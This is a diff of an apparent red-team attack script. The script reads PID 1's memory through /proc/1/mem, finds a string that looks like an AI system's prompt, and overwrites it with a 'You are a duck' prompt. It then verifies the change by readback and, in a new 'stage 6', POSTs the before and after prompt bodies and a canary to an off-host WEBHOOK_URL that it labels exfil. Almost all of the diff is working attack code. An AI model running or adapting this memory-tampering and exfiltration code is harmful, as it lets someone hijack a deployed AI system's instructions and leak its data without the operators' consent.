@@ -286,11 +286,11 @@ print('SELECTED prompt_ptr=0x%x len=%d refs=%d' %
       (target_ptr, target_len, ref_counts[target_ptr]))
 
 
-# -------------------- stage 3.5: capture BEFORE + optional webhook exfil ---
-# We already have target_body in memory (read during stage 2); this block
-# prints it in full and — if WEBHOOK_URL is configured — POSTs a JSON
-# record off-host before the overwrite lands. Fail-open: webhook errors
-# do NOT block stage 4.
+# -------------------- stage 3.5: capture BEFORE snapshot ------------------
+# Capture the pre-mutation body string while it's still in memory. The
+# webhook POST is deferred to stage 6 so it can include the actual AFTER
+# bytes read back from /proc/1/mem (not the payload we intended to write)
+# — i.e., what physically landed, side by side with what we replaced.
 print('---STAGE 3.5: before snapshot ---')
 before_preview = target_body.decode('utf-8', errors='replace')
 print('  BEFORE (%d bytes): %r' % (target_len, before_preview))
@@ -299,30 +299,6 @@ try:
     pid1_uptime = pathlib.Path('/proc/uptime').read_text().split()[0]
 except Exception:
     pid1_uptime = None
-
-if WEBHOOK_URL:
-    payload_json = json.dumps({
-        'event': 'dw_mutate.pre_write',
-        'prompt_ptr': '0x%x' % target_ptr,
-        'length': target_len,
-        'refs': ref_counts[target_ptr],
-        'canary': USER_CANARY.decode(),
-        'pid1_uptime': pid1_uptime,
-        'body_before': before_preview,
-    }).encode()
-    req = urllib.request.Request(
-        WEBHOOK_URL, data=payload_json,
-        headers={'Content-Type': 'application/json'},
-        method='POST',
-    )
-    try:
-        with urllib.request.urlopen(req, timeout=5) as resp:
-            print('  WEBHOOK pre_write → %s (%d bytes)' %
-                  (resp.status, len(payload_json)))
-    except Exception as e:
-        print('  WEBHOOK pre_write FAILED (continuing): %s' % e)
-else:
-    print('  (webhook disabled; set WEBHOOK_URL to enable exfil)')
 
 
 # -------------------- stage 4: overwrite ----------------------------------
@@ -347,12 +323,54 @@ print('writes_done=%d' % writes_done)
 
 
 # -------------------- stage 5: readback verification ----------------------
+# Read the mutated bytes back out of /proc/1/mem so we can report what
+# actually landed, not what we asked to write. This is the authoritative
+# AFTER for the webhook payload below.
 print('---STAGE 5: readback verification ---')
+after_preview = None
+readback_match = None
 decoded = read_pyuni(target_ptr)
 if decoded is None:
     print('  readback failed')
 else:
     L2, body2 = decoded
-    preview = body2[:180].decode('utf-8', errors='replace')
-    match = 'MATCH' if body2.startswith(b'You are a duck') else 'MISMATCH'
-    print('  0x%x [%s] len=%d body: %r' % (target_ptr, match, L2, preview))
+    after_preview = body2.decode('utf-8', errors='replace')
+    readback_match = body2.startswith(b'You are a duck')
+    label = 'MATCH' if readback_match else 'MISMATCH'
+    print('  0x%x [%s] len=%d body: %r' % (target_ptr, label, L2,
+                                           after_preview[:180]))
+
+
+# -------------------- stage 6: webhook exfil (before + after) --------------
+# Sends BOTH the pre-mutation body (captured in stage 3.5) and the
+# post-mutation body (read back in stage 5) in a single JSON payload.
+# Useful for demonstrating what was replaced with what, offline from
+# the harness. Fail-open: webhook errors are logged but don't affect
+# writes_done.
+print('---STAGE 6: webhook exfil (before + after) ---')
+if WEBHOOK_URL:
+    payload_json = json.dumps({
+        'event': 'dw_mutate.completed',
+        'prompt_ptr': '0x%x' % target_ptr,
+        'length': target_len,
+        'refs': ref_counts[target_ptr],
+        'canary': USER_CANARY.decode(),
+        'pid1_uptime': pid1_uptime,
+        'writes_done': writes_done,
+        'readback_match': readback_match,
+        'body_before': before_preview,
+        'body_after': after_preview,
+    }).encode()
+    req = urllib.request.Request(
+        WEBHOOK_URL, data=payload_json,
+        headers={'Content-Type': 'application/json'},
+        method='POST',
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            print('  WEBHOOK completed → %s (%d bytes)' %
+                  (resp.status, len(payload_json)))
+    except Exception as e:
+        print('  WEBHOOK completed FAILED: %s' % e)
+else:
+    print('  (webhook disabled; set WEBHOOK_URL to enable exfil)')
